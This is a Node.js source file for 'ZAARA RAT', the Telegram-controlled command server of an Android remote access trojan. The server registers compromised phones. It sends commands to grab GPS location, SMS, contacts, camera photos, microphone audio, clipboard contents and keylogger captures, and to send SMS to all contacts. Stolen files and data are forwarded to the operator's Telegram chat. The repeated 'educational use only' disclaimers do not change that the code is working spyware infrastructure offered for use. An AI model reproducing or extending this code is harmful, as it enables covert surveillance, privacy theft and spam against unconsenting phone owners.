/**
 * ═══════════════════════════════════════════════════════════════
 * ZAARA RAT - Advanced Android Remote Administration Tool
 * ═══════════════════════════════════════════════════════════════
 * 
 * @author ZAARA
 * @version 2.0.0
 * @license MIT (Educational Use Only)
 * @description Advanced Telegram-based Android RAT with enhanced
 *              security features, logging, and encryption
 * 
 * ⚠️  EDUCATIONAL PURPOSE ONLY ⚠️
 * This tool is designed for cybersecurity education and authorized
 * penetration testing only. Unauthorized use is illegal.
 * 
 * ═══════════════════════════════════════════════════════════════
 */

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ═══════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════

const CONFIG = JSON.parse(fs.readFileSync('data.json', 'utf8'));
const PORT = process.env.PORT || 3000;

// Advanced Configuration
const ADVANCED_CONFIG = {
    enableEncryption: true,
    sessionTimeout: 3600000, // 1 hour
    maxDevices: 100,
    enableLogging: true,
    logRetention: 7, // days
    enableRateLimiting: true,
    maxCommandsPerMinute: 30
};

// ═══════════════════════════════════════════════════════════════
// INITIALIZE APP
// ═══════════════════════════════════════════════════════════════

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// ═══════════════════════════════════════════════════════════════
// ENCRYPTION & SECURITY UTILITIES
// ═══════════════════════════════════════════════════════════════

class SecurityManager {
    constructor() {
        this.encryptionKey = crypto.randomBytes(32);
        this.activeSessions = new Map();
    }

    encrypt(text) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', this.encryptionKey, iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
    }

    decrypt(text) {
        const parts = text.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encryptedText = parts.join(':');
        const decipher = crypto.createDecipheriv('aes-256-cbc', this.encryptionKey, iv);
        let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    }

    generateSessionToken() {
        return crypto.randomBytes(32).toString('hex');
    }

    validateSession(sessionId) {
        const session = this.activeSessions.get(sessionId);
        if (!session) return false;
        if (Date.now() - session.createdAt > ADVANCED_CONFIG.sessionTimeout) {
            this.activeSessions.delete(sessionId);
            return false;
        }
        return true;
    }

    createSession(deviceId) {
        const sessionId = this.generateSessionToken();
        this.activeSessions.set(sessionId, {
            deviceId,
            createdAt: Date.now(),
            lastActivity: Date.now()
        });
        return sessionId;
    }
}

const securityManager = new SecurityManager();

// ═══════════════════════════════════════════════════════════════
// LOGGING SYSTEM
// ═══════════════════════════════════════════════════════════════

class Logger {
    constructor() {
        this.logsDir = path.join(__dirname, 'logs');
        if (!fs.existsSync(this.logsDir)) {
            fs.mkdirSync(this.logsDir);
        }
    }

    log(level, category, message, data = {}) {
        if (!ADVANCED_CONFIG.enableLogging) return;

        const timestamp = new Date().toISOString();
        const logEntry = {
            timestamp,
            level,
            category,
            message,
            data
        };

        const logFile = path.join(this.logsDir, `${new Date().toISOString().split('T')[0]}.log`);
        const logLine = JSON.stringify(logEntry) + '\n';

        fs.appendFileSync(logFile, logLine);

        // Console output
        const colors = {
            INFO: '\x1b[36m',
            WARN: '\x1b[33m',
            ERROR: '\x1b[31m',
            SUCCESS: '\x1b[32m'
        };
        console.log(`${colors[level] || ''}\x1b[0m[${timestamp}] [${level}] [${category}] ${message}`);
    }

    info(category, message, data) {
        this.log('INFO', category, message, data);
    }

    warn(category, message, data) {
        this.log('WARN', category, message, data);
    }

    error(category, message, data) {
        this.log('ERROR', category, message, data);
    }

    success(category, message, data) {
        this.log('SUCCESS', category, message, data);
    }
}

const logger = new Logger();

// ═══════════════════════════════════════════════════════════════
// DEVICE MANAGEMENT
// ═══════════════════════════════════════════════════════════════

class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.commandQueue = new Map();
    }

    addDevice(socketId, deviceInfo) {
        const deviceId = uuidv4();
        const sessionId = securityManager.createSession(deviceId);
        
        this.devices.set(deviceId, {
            id: deviceId,
            socketId,
            sessionId,
            info: deviceInfo,
            connectedAt: Date.now(),
            lastSeen: Date.now(),
            commands: [],
            status: 'online'
        });

        logger.success('DEVICE', `New device connected: ${deviceId}`, deviceInfo);
        return { deviceId, sessionId };
    }

    getDevice(deviceId) {
        return this.devices.get(deviceId);
    }

    getAllDevices() {
        return Array.from(this.devices.values());
    }

    removeDevice(deviceId) {
        const device = this.devices.get(deviceId);
        if (device) {
            this.devices.delete(deviceId);
            logger.info('DEVICE', `Device disconnected: ${deviceId}`);
        }
    }

    updateLastSeen(deviceId) {
        const device = this.devices.get(deviceId);
        if (device) {
            device.lastSeen = Date.now();
        }
    }

    addCommand(deviceId, command) {
        const device = this.devices.get(deviceId);
        if (device) {
            device.commands.push({
                id: uuidv4(),
                command,
                timestamp: Date.now(),
                status: 'pending'
            });
        }
    }
}

const deviceManager = new DeviceManager();

// ═══════════════════════════════════════════════════════════════
// TELEGRAM BOT
// ═══════════════════════════════════════════════════════════════

let bot;
let selectedDevice = null;

try {
    bot = new TelegramBot(CONFIG.token, { polling: true });
    logger.success('TELEGRAM', 'Telegram bot initialized successfully');
} catch (error) {
    logger.error('TELEGRAM', 'Failed to initialize Telegram bot', { error: error.message });
    process.exit(1);
}

// Rate limiting for commands
const commandRateLimiter = new Map();

function checkRateLimit(chatId) {
    if (!ADVANCED_CONFIG.enableRateLimiting) return true;

    const now = Date.now();
    const userCommands = commandRateLimiter.get(chatId) || [];
    const recentCommands = userCommands.filter(time => now - time < 60000);

    if (recentCommands.length >= ADVANCED_CONFIG.maxCommandsPerMinute) {
        return false;
    }

    recentCommands.push(now);
    commandRateLimiter.set(chatId, recentCommands);
    return true;
}

// ═══════════════════════════════════════════════════════════════
// TELEGRAM BOT COMMANDS
// ═══════════════════════════════════════════════════════════════

const COMMANDS = {
    MAIN_MENU: '📱 Main Menu',
    DEVICE_LIST: '📋 Device List',
    DEVICE_INFO: 'ℹ️ Device Info',
    LOCATION: '📍 Get Location',
    MESSAGES: '💬 Get Messages',
    CONTACTS: '👥 Get Contacts',
    APPS: '📦 Installed Apps',
    CAMERA_MAIN: '📷 Main Camera',
    CAMERA_FRONT: '🤳 Front Camera',
    MICROPHONE: '🎤 Record Audio',
    CLIPBOARD: '📋 Get Clipboard',
    NOTIFICATION: '🔔 Send Notification',
    TOAST: '💬 Show Toast',
    VIBRATE: '📳 Vibrate',
    SEND_SMS: '✉️ Send SMS',
    SMS_ALL: '📨 SMS to All Contacts',
    FILE_MANAGER: '📁 File Manager',
    KEYLOGGER: '⌨️ Keylogger Data',
    SCREEN_INFO: '🖥️ Screen Info',
    SIM_INFO: '📡 SIM Info',
    BACK: '⬅️ Back'
};

function getMainMenu() {
    return {
        reply_markup: {
            keyboard: [
                [COMMANDS.DEVICE_LIST, COMMANDS.DEVICE_INFO],
                [COMMANDS.LOCATION, COMMANDS.MESSAGES],
                [COMMANDS.CONTACTS, COMMANDS.APPS],
                [COMMANDS.CAMERA_MAIN, COMMANDS.CAMERA_FRONT],
                [COMMANDS.MICROPHONE, COMMANDS.CLIPBOARD],
                [COMMANDS.NOTIFICATION, COMMANDS.SEND_SMS],
                [COMMANDS.FILE_MANAGER, COMMANDS.KEYLOGGER]
            ],
            resize_keyboard: true
        }
    };
}

// Welcome message
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== CONFIG.id) {
        bot.sendMessage(chatId, '❌ Unauthorized access');
        logger.warn('TELEGRAM', 'Unauthorized access attempt', { chatId });
        return;
    }

    const welcomeMessage = `
╔══════════════════════════════════╗
║   🔐 ZAARA RAT Control Panel 🔐   ║
╚══════════════════════════════════╝

👤 Author: ZAARA
📅 Version: 2.0.0 Advanced
🔒 Security: Enhanced Encryption

📊 System Status:
├─ Connected Devices: ${deviceManager.getAllDevices().length}
├─ Active Sessions: ${securityManager.activeSessions.size}
├─ Encryption: ${ADVANCED_CONFIG.enableEncryption ? '✅ Enabled' : '❌ Disabled'}
└─ Logging: ${ADVANCED_CONFIG.enableLogging ? '✅ Enabled' : '❌ Disabled'}

⚠️ EDUCATIONAL USE ONLY ⚠️

Use /help for commands list
    `;

    bot.sendMessage(chatId, welcomeMessage, getMainMenu());
    logger.info('TELEGRAM', 'User started bot', { chatId });
});

// Help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    
    const helpMessage = `
🔰 ZAARA RAT - Command Guide

📱 DEVICE MANAGEMENT:
/devices - List all connected devices
/select - Select a device to control

📍 INFORMATION GATHERING:
• Get Location - GPS coordinates
• Device Info - Complete device details
• SIM Info - Carrier information
• Screen Info - Display specifications

💬 COMMUNICATION:
• Get Messages - All SMS messages
• Get Contacts - Contact list
• Send SMS - Send message to number
• SMS to All - Broadcast to contacts

📷 MEDIA CAPTURE:
• Main Camera - Rear camera photo
• Front Camera - Selfie camera photo
• Record Audio - Microphone recording
• Get Clipboard - Current clipboard

📦 APPLICATIONS:
• Installed Apps - List all apps
• File Manager - Browse files
• Keylogger - Captured keystrokes

🔔 INTERACTIONS:
• Send Notification - Custom notification
• Show Toast - Display toast message
• Vibrate - Vibrate device

🔒 SECURITY FEATURES:
├─ End-to-end command encryption
├─ Session management
├─ Rate limiting protection
└─ Comprehensive audit logging

Made with ❤️ by ZAARA for Cybersecurity Education
    `;

    bot.sendMessage(chatId, helpMessage);
});

// Device list command
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (chatId.toString() !== CONFIG.id) return;

    if (!checkRateLimit(chatId)) {
        bot.sendMessage(chatId, '⚠️ Rate limit exceeded. Please wait a moment.');
        return;
    }

    switch (text) {
        case COMMANDS.DEVICE_LIST:
        case '/devices':
            const devices = deviceManager.getAllDevices();
            
            if (devices.length === 0) {
                bot.sendMessage(chatId, '📋 No devices connected');
                return;
            }

            let deviceList = '╔══════════════════════════════╗\n';
            deviceList += '║     📱 CONNECTED DEVICES     ║\n';
            deviceList += '╚══════════════════════════════╝\n\n';

            devices.forEach((device, index) => {
                const uptime = Math.floor((Date.now() - device.connectedAt) / 1000 / 60);
                deviceList += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                deviceList += `📱 Device ${index + 1}\n`;
                deviceList += `├─ ID: ${device.id.substring(0, 8)}...\n`;
                deviceList += `├─ Model: ${device.info?.model || 'Unknown'}\n`;
                deviceList += `├─ Android: ${device.info?.androidVersion || 'Unknown'}\n`;
                deviceList += `├─ Battery: ${device.info?.battery || 'N/A'}%\n`;
                deviceList += `├─ Status: ${device.status === 'online' ? '🟢 Online' : '🔴 Offline'}\n`;
                deviceList += `└─ Uptime: ${uptime} minutes\n`;
            });

            bot.sendMessage(chatId, deviceList, {
                reply_markup: {
                    inline_keyboard: devices.map((device, index) => [{
                        text: `Select Device ${index + 1}`,
                        callback_data: `select_${device.id}`
                    }])
                }
            });
            break;

        case COMMANDS.MAIN_MENU:
            bot.sendMessage(chatId, '📱 Main Menu', getMainMenu());
            break;
    }
});

// Handle device selection
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data.startsWith('select_')) {
        const deviceId = data.replace('select_', '');
        selectedDevice = deviceId;
        
        const device = deviceManager.getDevice(deviceId);
        
        bot.sendMessage(chatId, `✅ Device selected:\n${device.info?.model || 'Unknown'}\n\nYou can now execute commands on this device.`, getMainMenu());
        logger.info('TELEGRAM', 'Device selected', { deviceId });
    }
});

// ═══════════════════════════════════════════════════════════════
// SOCKET.IO - CLIENT COMMUNICATION
// ═══════════════════════════════════════════════════════════════

io.on('connection', (socket) => {
    logger.info('SOCKET', 'New socket connection', { socketId: socket.id });

    // Device registration
    socket.on('register', (deviceInfo) => {
        const { deviceId, sessionId } = deviceManager.addDevice(socket.id, deviceInfo);
        
        socket.emit('registered', { deviceId, sessionId });
        
        // Notify Telegram
        if (CONFIG.id) {
            const message = `
╔══════════════════════════════╗
║   🟢 NEW DEVICE CONNECTED    ║
╚══════════════════════════════╝

📱 Device Information:
├─ ID: ${deviceId.substring(0, 8)}...
├─ Model: ${deviceInfo.model || 'Unknown'}
├─ Manufacturer: ${deviceInfo.manufacturer || 'Unknown'}
├─ Android: ${deviceInfo.androidVersion || 'Unknown'}
├─ SDK: ${deviceInfo.sdk || 'Unknown'}
├─ Battery: ${deviceInfo.battery || 'N/A'}%
└─ Time: ${new Date().toLocaleString()}

🔐 Session: ${sessionId.substring(0, 16)}...
            `;
            
            bot.sendMessage(CONFIG.id, message);
        }
    });

    // Handle command responses
    socket.on('commandResponse', (data) => {
        logger.info('SOCKET', 'Command response received', { type: data.type });
        
        if (CONFIG.id) {
            switch (data.type) {
                case 'location':
                    bot.sendMessage(CONFIG.id, `📍 Location:\n\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\n\n🗺️ Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}`);
                    break;
                
                case 'deviceInfo':
                    const info = `
📱 Device Information:
━━━━━━━━━━━━━━━━━━━━━
🏷️ Model: ${data.model}
🏭 Manufacturer: ${data.manufacturer}
📊 Android: ${data.androidVersion}
🔢 SDK: ${data.sdk}
🔋 Battery: ${data.battery}%
📶 Network: ${data.networkType}
💾 Storage: ${data.storage}
🧠 RAM: ${data.ram}
                    `;
                    bot.sendMessage(CONFIG.id, info);
                    break;

                case 'clipboard':
                    bot.sendMessage(CONFIG.id, `📋 Clipboard:\n\n${data.content || 'Empty'}`);
                    break;

                default:
                    bot.sendMessage(CONFIG.id, `✅ Command executed: ${data.type}`);
            }
        }
    });

    // Handle file uploads
    socket.on('fileUpload', (data) => {
        logger.success('SOCKET', 'File upload received', { fileName: data.fileName });
        
        // Save file
        const uploadsDir = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadsDir)) {
            fs.mkdirSync(uploadsDir);
        }

        const filePath = path.join(uploadsDir, data.fileName);
        fs.writeFileSync(filePath, Buffer.from(data.fileData, 'base64'));

        if (CONFIG.id) {
            bot.sendDocument(CONFIG.id, filePath, {
                caption: `📁 File: ${data.fileName}\n📏 Size: ${(data.fileData.length / 1024).toFixed(2)} KB`
            });
        }
    });

    // Heartbeat
    socket.on('heartbeat', (data) => {
        deviceManager.updateLastSeen(data.deviceId);
    });

    // Disconnect
    socket.on('disconnect', () => {
        logger.info('SOCKET', 'Socket disconnected', { socketId: socket.id });
        
        // Find and remove device
        const devices = deviceManager.getAllDevices();
        const device = devices.find(d => d.socketId === socket.id);
        
        if (device) {
            deviceManager.removeDevice(device.id);
            
            if (CONFIG.id) {
                bot.sendMessage(CONFIG.id, `🔴 Device disconnected:\n${device.info?.model || 'Unknown'}\nID: ${device.id.substring(0, 8)}...`);
            }
        }
    });
});

// ═══════════════════════════════════════════════════════════════
// HTTP ROUTES
// ═══════════════════════════════════════════════════════════════

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>ZAARA RAT - Control Panel</title>
            <style>
                body {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    color: white;
                }
                .container {
                    text-align: center;
                    background: rgba(255, 255, 255, 0.1);
                    padding: 50px;
                    border-radius: 20px;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
                }
                h1 { margin: 0 0 10px 0; font-size: 3em; }
                .status { color: #4ade80; font-size: 1.2em; margin: 20px 0; }
                .info { margin: 10px 0; opacity: 0.9; }
                .badge { 
                    background: rgba(255, 255, 255, 0.2);
                    padding: 5px 15px;
                    border-radius: 20px;
                    display: inline-block;
                    margin: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔐 ZAARA RAT</h1>
                <p class="status">✅ Server Running</p>
                <div class="info">
                    <div class="badge">👤 Author: ZAARA</div>
                    <div class="badge">📅 Version: 2.0.0</div>
                    <div class="badge">🔒 Security: Enhanced</div>
                </div>
                <p style="margin-top: 30px; opacity: 0.7;">
                    ⚠️ Educational Purpose Only<br>
                    Advanced Cybersecurity Research Tool
                </p>
            </div>
        </body>
        </html>
    `);
});

// API endpoint for device status
app.get('/api/devices', (req, res) => {
    const devices = deviceManager.getAllDevices().map(d => ({
        id: d.id,
        model: d.info?.model,
        status: d.status,
        connectedAt: d.connectedAt,
        lastSeen: d.lastSeen
    }));

    res.json({
        success: true,
        count: devices.length,
        devices
    });
});

// API endpoint for system stats
app.get('/api/stats', (req, res) => {
    res.json({
        success: true,
        stats: {
            connectedDevices: deviceManager.getAllDevices().length,
            activeSessions: securityManager.activeSessions.size,
            uptime: process.uptime(),
            version: '2.0.0',
            author: 'ZAARA',
            security: {
                encryption: ADVANCED_CONFIG.enableEncryption,
                logging: ADVANCED_CONFIG.enableLogging,
                rateLimiting: ADVANCED_CONFIG.enableRateLimiting
            }
        }
    });
});

// ═══════════════════════════════════════════════════════════════
// START SERVER
// ═══════════════════════════════════════════════════════════════

server.listen(PORT, () => {
    console.log('\n');
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║                                                        ║');
    console.log('║           🔐 ZAARA RAT - Control Server 🔐            ║');
    console.log('║                                                        ║');
    console.log('╚════════════════════════════════════════════════════════╝');
    console.log('');
    console.log('  👤 Author      : ZAARA');
    console.log('  📅 Version     : 2.0.0 Advanced');
    console.log('  🌐 Server URL  : http://localhost:' + PORT);
    console.log('  🔒 Encryption  : ' + (ADVANCED_CONFIG.enableEncryption ? '✅ Enabled' : '❌ Disabled'));
    console.log('  📝 Logging     : ' + (ADVANCED_CONFIG.enableLogging ? '✅ Enabled' : '❌ Disabled'));
    console.log('  🛡️  Rate Limit  : ' + (ADVANCED_CONFIG.enableRateLimiting ? '✅ Enabled' : '❌ Disabled'));
    console.log('');
    console.log('  ⚠️  EDUCATIONAL USE ONLY - Unauthorized use is illegal');
    console.log('');
    console.log('════════════════════════════════════════════════════════');
    console.log('');
    
    logger.success('SERVER', `Server started on port ${PORT}`);
});

// Graceful shutdown
process.on('SIGINT', () => {
    logger.info('SERVER', 'Shutting down gracefully...');
    server.close(() => {
        logger.info('SERVER', 'Server closed');
        process.exit(0);
    });
});

// Error handling
process.on('uncaughtException', (error) => {
    logger.error('SERVER', 'Uncaught exception', { error: error.message, stack: error.stack });
});

process.on('unhandledRejection', (reason, promise) => {
    logger.error('SERVER', 'Unhandled rejection', { reason });
});
